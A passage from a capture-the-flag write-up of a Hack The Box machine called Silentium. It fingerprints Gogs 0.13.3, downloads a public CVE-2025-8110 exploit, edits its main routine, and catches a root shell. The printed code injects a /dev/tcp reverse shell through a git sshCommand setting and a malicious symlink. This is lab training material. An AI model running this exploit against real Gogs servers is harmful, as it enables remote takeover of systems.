+   just raised the bar for easy, resilient and secure K8s cluster deployment.
+
+   https://ubuntu.com/engage/secure-kubernetes-at-the-edge
+
+Expanded Security Maintenance for Applications is not enabled.
+
+68 updates can be applied immediately.
+52 of these updates are standard security updates.
+To see these additional updates run: apt list --upgradable
+
+1 additional security update can be applied with ESM Apps.
+Learn more about enabling ESM Apps service at https://ubuntu.com/esm
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+Last login: Mon Aug 24 14:42:38 2026 from 10.10.15.20
+</pre> </div> </div> <p><br> Check the Gogs landing page.</p> <div class="row justify-content-sm-center"> <div class="col-sm-8 mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/silentium/landingpage3001.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Gogs Landing Page 3001" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><br> Try registering a new user.</p> <div class="row justify-content-sm-center"> <div class="col-sm-8 mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/silentium/registeruser.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Register User" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><br> Authenticate as said new user.</p> <div class="row justify-content-sm-center"> <div class="col-sm-8 mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/silentium/authenticateuser.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Authenticate User" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><br> Add the subdomain to the <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file.</p> <div class="terminal" data-language="bash" id="terminal-bash-bash-4471"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalClose('bash-bash-4471')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" onclick="terminalMinimize('bash-bash-4471')" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalMaximize('bash-bash-4471')" title="Maximize"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopy('bash-bash-4471')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body" id="terminal-body-bash-bash-4471">
+┌─[au-dedivip-1]─[10.10.15.20]─[biscottidiskette@htb-oldwz1kkne]─[~/my_data/machines/silentium]
+└──╼ [★]$ cat /etc/hosts
+127.0.0.1	localhost
+127.0.1.1	pwnbox7.1
+10.129.245.103  silentium.htb staging.silentium.htb staging-v2-code.dev.silentium.htb
+
+# The following lines are desirable for IPv6 capable hosts
+::1     localhost ip6-localhost ip6-loopback
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+127.0.0.1 localhost
+127.0.1.1 htb-oldwz1kkne htb-oldwz1kkne.htb-cloud.com
+</pre> </div> <div class="terminal__overlay" id="overlay-bash-bash-4471" onclick="terminalOverlayClose('bash-bash-4471')"> <div class="terminal__modal" onclick="event.stopPropagation()"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalOverlayClose('bash-bash-4471')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalOverlayClose('bash-bash-4471')" title="Restore"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopyModal('bash-bash-4471')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body terminal__body--modal" id="terminal-modal-body-bash-bash-4471" data-language="bash">
+┌─[au-dedivip-1]─[10.10.15.20]─[biscottidiskette@htb-oldwz1kkne]─[~/my_data/machines/silentium]
+└──╼ [★]$ cat /etc/hosts
+127.0.0.1	localhost
+127.0.1.1	pwnbox7.1
+10.129.245.103  silentium.htb staging.silentium.htb staging-v2-code.dev.silentium.htb
+
+# The following lines are desirable for IPv6 capable hosts
+::1     localhost ip6-localhost ip6-loopback
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+127.0.0.1 localhost
+127.0.1.1 htb-oldwz1kkne htb-oldwz1kkne.htb-cloud.com
+</pre> </div> </div> <p><br> Check the new subdomain to ensure that it is still the Gogs from earlier.</p> <div class="row justify-content-sm-center"> <div class="col-sm-8 mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/silentium/gogs.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Gogs Landing Page" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><br> Use the binary directly to get the version number.</p> <div class="terminal" data-language="bash" id="terminal-bash-bash-468"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalClose('bash-bash-468')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" onclick="terminalMinimize('bash-bash-468')" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalMaximize('bash-bash-468')" title="Maximize"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopy('bash-bash-468')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body" id="terminal-body-bash-bash-468">
+ben@silentium:/opt/gogs/gogs$ ./gogs --version
+Gogs version 0.13.3
+</pre> </div> <div class="terminal__overlay" id="overlay-bash-bash-468" onclick="terminalOverlayClose('bash-bash-468')"> <div class="terminal__modal" onclick="event.stopPropagation()"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalOverlayClose('bash-bash-468')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalOverlayClose('bash-bash-468')" title="Restore"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopyModal('bash-bash-468')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body terminal__body--modal" id="terminal-modal-body-bash-bash-468" data-language="bash">
+ben@silentium:/opt/gogs/gogs$ ./gogs --version
+Gogs version 0.13.3
+</pre> </div> </div> <p><br> Search for that version and find an exploit for Gogs.</p> <div class="row justify-content-sm-center"> <div class="col-sm-8 mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/silentium/gogsexploit.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Gogs Exploit" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><a href="https://github.com/zAbuQasem/gogs-CVE-2025-8110/tree/main" rel="external nofollow noopener" target="_blank">https://github.com/zAbuQasem/gogs-CVE-2025-8110/tree/main</a></p> <p><br> Download the new exploit into our working folder.</p> <div class="terminal" data-language="bash" id="terminal-bash-bash-4927"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalClose('bash-bash-4927')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" onclick="terminalMinimize('bash-bash-4927')" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalMaximize('bash-bash-4927')" title="Maximize"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopy('bash-bash-4927')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body" id="terminal-body-bash-bash-4927">
+┌─[au-dedivip-1]─[10.10.15.20]─[biscottidiskette@htb-ach1lmuueq]─[~/my_data/machines/silentium]
+└──╼ [★]$ wget https://raw.githubusercontent.com/zAbuQasem/gogs-CVE-2025-8110/refs/heads/main/CVE-2025-8110.py
+--2026-08-26 12:25:32--  https://raw.githubusercontent.com/zAbuQasem/gogs-CVE-2025-8110/refs/heads/main/CVE-2025-8110.py
+Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.109.133, 185.199.110.133, 185.199.108.133, ...
+Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.109.133|:443... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 7876 (7.7K) [text/plain]
+Saving to: ‘CVE-2025-8110.py’
+
+CVE-2025-8110.py                                100%[=====================================================================================================&gt;]   7.69K  --.-KB/s    in 0s      
+
+2026-08-26 12:25:32 (97.6 MB/s) - ‘CVE-2025-8110.py’ saved [7876/7876]
+</pre> </div> <div class="terminal__overlay" id="overlay-bash-bash-4927" onclick="terminalOverlayClose('bash-bash-4927')"> <div class="terminal__modal" onclick="event.stopPropagation()"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalOverlayClose('bash-bash-4927')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalOverlayClose('bash-bash-4927')" title="Restore"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopyModal('bash-bash-4927')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body terminal__body--modal" id="terminal-modal-body-bash-bash-4927" data-language="bash">
+┌─[au-dedivip-1]─[10.10.15.20]─[biscottidiskette@htb-ach1lmuueq]─[~/my_data/machines/silentium]
+└──╼ [★]$ wget https://raw.githubusercontent.com/zAbuQasem/gogs-CVE-2025-8110/refs/heads/main/CVE-2025-8110.py
+--2026-08-26 12:25:32--  https://raw.githubusercontent.com/zAbuQasem/gogs-CVE-2025-8110/refs/heads/main/CVE-2025-8110.py
+Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.109.133, 185.199.110.133, 185.199.108.133, ...
+Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.109.133|:443... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 7876 (7.7K) [text/plain]
+Saving to: ‘CVE-2025-8110.py’
+
+CVE-2025-8110.py                                100%[=====================================================================================================&gt;]   7.69K  --.-KB/s    in 0s      
+
+2026-08-26 12:25:32 (97.6 MB/s) - ‘CVE-2025-8110.py’ saved [7876/7876]
+</pre> </div> </div> <p><br> Start a netcat listener…again.</p> <div class="terminal" data-language="bash" id="terminal-bash-bash-4150"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalClose('bash-bash-4150')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" onclick="terminalMinimize('bash-bash-4150')" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalMaximize('bash-bash-4150')" title="Maximize"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopy('bash-bash-4150')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body" id="terminal-body-bash-bash-4150">
+┌─[au-dedivip-1]─[10.10.15.20]─[biscottidiskette@htb-ach1lmuueq]─[~/my_data/machines/silentium]
+└──╼ [★]$ sudo nc -nlvp 443
+Listening on 0.0.0.0 443
+</pre> </div> <div class="terminal__overlay" id="overlay-bash-bash-4150" onclick="terminalOverlayClose('bash-bash-4150')"> <div class="terminal__modal" onclick="event.stopPropagation()"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalOverlayClose('bash-bash-4150')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalOverlayClose('bash-bash-4150')" title="Restore"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopyModal('bash-bash-4150')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body terminal__body--modal" id="terminal-modal-body-bash-bash-4150" data-language="bash">
+┌─[au-dedivip-1]─[10.10.15.20]─[biscottidiskette@htb-ach1lmuueq]─[~/my_data/machines/silentium]
+└──╼ [★]$ sudo nc -nlvp 443
+Listening on 0.0.0.0 443
+</pre> </div> </div> <p><br> Run the exploit.</p> <div class="terminal" data-language="bash" id="terminal-bash-bash-4256"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalClose('bash-bash-4256')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" onclick="terminalMinimize('bash-bash-4256')" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalMaximize('bash-bash-4256')" title="Maximize"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopy('bash-bash-4256')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body" id="terminal-body-bash-bash-4256">
+┌─[au-dedivip-1]─[10.10.15.20]─[biscottidiskette@htb-ach1lmuueq]─[~/my_data/machines/silentium]
+└──╼ [★]$ python3 CVE-2025-8110.py -u http://staging-v2-code.dev.silentium.htb -lh 10.10.15.20 -lp 443
+Registration failed: 200
+[-] Error: Registration failed
+</pre> </div> <div class="terminal__overlay" id="overlay-bash-bash-4256" onclick="terminalOverlayClose('bash-bash-4256')"> <div class="terminal__modal" onclick="event.stopPropagation()"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalOverlayClose('bash-bash-4256')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalOverlayClose('bash-bash-4256')" title="Restore"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopyModal('bash-bash-4256')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body terminal__body--modal" id="terminal-modal-body-bash-bash-4256" data-language="bash">
+┌─[au-dedivip-1]─[10.10.15.20]─[biscottidiskette@htb-ach1lmuueq]─[~/my_data/machines/silentium]
+└──╼ [★]$ python3 CVE-2025-8110.py -u http://staging-v2-code.dev.silentium.htb -lh 10.10.15.20 -lp 443
+Registration failed: 200
+[-] Error: Registration failed
+</pre> </div> </div> <p><br> Update the script to use the doink user from earlier.</p> <div class="terminal" data-language="python" id="terminal-cve-2025-8110-py-python-161473"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalClose('cve-2025-8110-py-python-161473')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" onclick="terminalMinimize('cve-2025-8110-py-python-161473')" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalMaximize('cve-2025-8110-py-python-161473')" title="Maximize"></button> </div> <span class="terminal__title">CVE-2025-8110.py</span> <button class="terminal__copy" onclick="terminalCopy('cve-2025-8110-py-python-161473')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body" id="terminal-body-cve-2025-8110-py-python-161473">
+
+&lt;snip&gt;
+
+def main():
+    parser = argparse.ArgumentParser()
+    parser.add_argument("-u", "--url", required=True, help="Gogs base URL")
+    parser.add_argument("-lh", "--host", required=True, help="Attacker host")
+    parser.add_argument("-lp", "--port", required=True, help="Attacker port")
+    parser.add_argument("-x", "--proxy", action="store_true", help="Use proxy")
+    args = parser.parse_args()
+    session = requests.Session()
+    if args.proxy:
+        session.proxies.update(proxies)
+    session.verify = False
+    username = "doink"
+    password = "letmein"
+    command = f"bash -c 'bash -i &gt;&amp; /dev/tcp/{args.host}/{args.port} 0&gt;&amp;1' #"
+    try:
+        login(session, args.url, username, password)
+        token = get_application_token(session, args.url)
+        repo_name = create_malicious_repo(session, args.url, token)
+        git_config = f"""[core]
+	repositoryformatversion = 0
+	filemode = true
+	bare = false
+	logallrefupdates = true
+	ignorecase = true
+	precomposeunicode = true
+  sshCommand = {command}
+[remote "origin"]
+	url = git@localhost:gogs/{repo_name}.git
+	fetch = +refs/heads/*:refs/remotes/origin/*
+[branch "master"]
+	remote = origin
+	merge = refs/heads/master
+"""
+        upload_malicious_symlink(args.url, username, password, repo_name)
+        exploit(session, args.url, token, username, repo_name, git_config)
+
+    except Exception as e:
+        console.print(f"[bold red][-] Error: {e}[/bold red]")
+
+
+if __name__ == "__main__":
+    main()
+</pre> </div> <div class="terminal__overlay" id="overlay-cve-2025-8110-py-python-161473" onclick="terminalOverlayClose('cve-2025-8110-py-python-161473')"> <div class="terminal__modal" onclick="event.stopPropagation()"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalOverlayClose('cve-2025-8110-py-python-161473')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalOverlayClose('cve-2025-8110-py-python-161473')" title="Restore"></button> </div> <span class="terminal__title">CVE-2025-8110.py</span> <button class="terminal__copy" onclick="terminalCopyModal('cve-2025-8110-py-python-161473')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body terminal__body--modal" id="terminal-modal-body-cve-2025-8110-py-python-161473" data-language="python">
+
+&lt;snip&gt;
+
+def main():
+    parser = argparse.ArgumentParser()
+    parser.add_argument("-u", "--url", required=True, help="Gogs base URL")
+    parser.add_argument("-lh", "--host", required=True, help="Attacker host")
+    parser.add_argument("-lp", "--port", required=True, help="Attacker port")
+    parser.add_argument("-x", "--proxy", action="store_true", help="Use proxy")
+    args = parser.parse_args()
+    session = requests.Session()
+    if args.proxy:
+        session.proxies.update(proxies)
+    session.verify = False
+    username = "doink"
+    password = "letmein"
+    command = f"bash -c 'bash -i &gt;&amp; /dev/tcp/{args.host}/{args.port} 0&gt;&amp;1' #"
+    try:
+        login(session, args.url, username, password)
+        token = get_application_token(session, args.url)
+        repo_name = create_malicious_repo(session, args.url, token)
+        git_config = f"""[core]
+	repositoryformatversion = 0
+	filemode = true
+	bare = false
+	logallrefupdates = true
+	ignorecase = true
+	precomposeunicode = true
+  sshCommand = {command}
+[remote "origin"]
+	url = git@localhost:gogs/{repo_name}.git
+	fetch = +refs/heads/*:refs/remotes/origin/*
+[branch "master"]
+	remote = origin
+	merge = refs/heads/master
+"""
+        upload_malicious_symlink(args.url, username, password, repo_name)
+        exploit(session, args.url, token, username, repo_name, git_config)
+
+    except Exception as e:
+        console.print(f"[bold red][-] Error: {e}[/bold red]")
+
+
+if __name__ == "__main__":
+    main()
+</pre> </div> </div> <p><br> Run the script again.</p> <div class="terminal" data-language="bash" id="terminal-bash-bash-41225"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalClose('bash-bash-41225')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" onclick="terminalMinimize('bash-bash-41225')" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalMaximize('bash-bash-41225')" title="Maximize"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopy('bash-bash-41225')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body" id="terminal-body-bash-bash-41225">
+┌─[au-dedivip-1]─[10.10.15.20]─[biscottidiskette@htb-ach1lmuueq]─[~/my_data/machines/silentium]
+└──╼ [★]$ python3 CVE-2025-8110.py -u http://staging-v2-code.dev.silentium.htb -lh 10.10.15.20 -lp 443
+[+] Authenticated successfully
+Token generation status: 200
+[+] Application token: 4909908d0b1b27b61438a0dc4a2450827c6f0916
+Repo creation status: 201
+Cloning into '/tmp/45d2ba1ff5a4'...
+remote: Enumerating objects: 3, done.
+remote: Counting objects: 100% (3/3), done.
+remote: Total 3 (delta 0), reused 0 (delta 0), pack-reused 0
+Unpacking objects: 100% (3/3), 250 bytes | 250.00 KiB/s, done.
+[master 3b53fa4] Add malicious symlink
+ 1 file changed, 1 insertion(+)
+ create mode 120000 malicious_link
+Enumerating objects: 4, done.
+Counting objects: 100% (4/4), done.
+Delta compression using up to 4 threads
+Compressing objects: 100% (2/2), done.
+Writing objects: 100% (3/3), 292 bytes | 292.00 KiB/s, done.
+Total 3 (delta 0), reused 0 (delta 0), pack-reused 0 (from 0)
+To http://staging-v2-code.dev.silentium.htb/doink/45d2ba1ff5a4.git
+   eaa8bab..3b53fa4  master -&gt; master
+[+] Exploit sent, check your listener!
+[-] Error: HTTPConnectionPool(host='staging-v2-code.dev.silentium.htb', port=80): Read timed out. (read timeout=5)
+</pre> </div> <div class="terminal__overlay" id="overlay-bash-bash-41225" onclick="terminalOverlayClose('bash-bash-41225')"> <div class="terminal__modal" onclick="event.stopPropagation()"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalOverlayClose('bash-bash-41225')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalOverlayClose('bash-bash-41225')" title="Restore"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopyModal('bash-bash-41225')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body terminal__body--modal" id="terminal-modal-body-bash-bash-41225" data-language="bash">
+┌─[au-dedivip-1]─[10.10.15.20]─[biscottidiskette@htb-ach1lmuueq]─[~/my_data/machines/silentium]
+└──╼ [★]$ python3 CVE-2025-8110.py -u http://staging-v2-code.dev.silentium.htb -lh 10.10.15.20 -lp 443
+[+] Authenticated successfully
+Token generation status: 200
+[+] Application token: 4909908d0b1b27b61438a0dc4a2450827c6f0916
+Repo creation status: 201
+Cloning into '/tmp/45d2ba1ff5a4'...
+remote: Enumerating objects: 3, done.
+remote: Counting objects: 100% (3/3), done.
+remote: Total 3 (delta 0), reused 0 (delta 0), pack-reused 0
+Unpacking objects: 100% (3/3), 250 bytes | 250.00 KiB/s, done.
+[master 3b53fa4] Add malicious symlink
+ 1 file changed, 1 insertion(+)
+ create mode 120000 malicious_link
+Enumerating objects: 4, done.
+Counting objects: 100% (4/4), done.
+Delta compression using up to 4 threads
+Compressing objects: 100% (2/2), done.
+Writing objects: 100% (3/3), 292 bytes | 292.00 KiB/s, done.
+Total 3 (delta 0), reused 0 (delta 0), pack-reused 0 (from 0)
+To http://staging-v2-code.dev.silentium.htb/doink/45d2ba1ff5a4.git
+   eaa8bab..3b53fa4  master -&gt; master
+[+] Exploit sent, check your listener!
+[-] Error: HTTPConnectionPool(host='staging-v2-code.dev.silentium.htb', port=80): Read timed out. (read timeout=5)
+</pre> </div> </div> <p><br> Check the listener and catch the shell.</p> <div class="terminal" data-language="bash" id="terminal-bash-bash-4265"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalClose('bash-bash-4265')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" onclick="terminalMinimize('bash-bash-4265')" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalMaximize('bash-bash-4265')" title="Maximize"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopy('bash-bash-4265')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body" id="terminal-body-bash-bash-4265">
+└──╼ [★]$ sudo nc -nlvp 443
+Listening on 0.0.0.0 443
+Connection received on 10.129.245.103 34760
+bash: cannot set terminal process group (1476): Inappropriate ioctl for device
+bash: no job control in this shell
+root@silentium:/opt/gogs/gogs/data/tmp/local-repo/2#
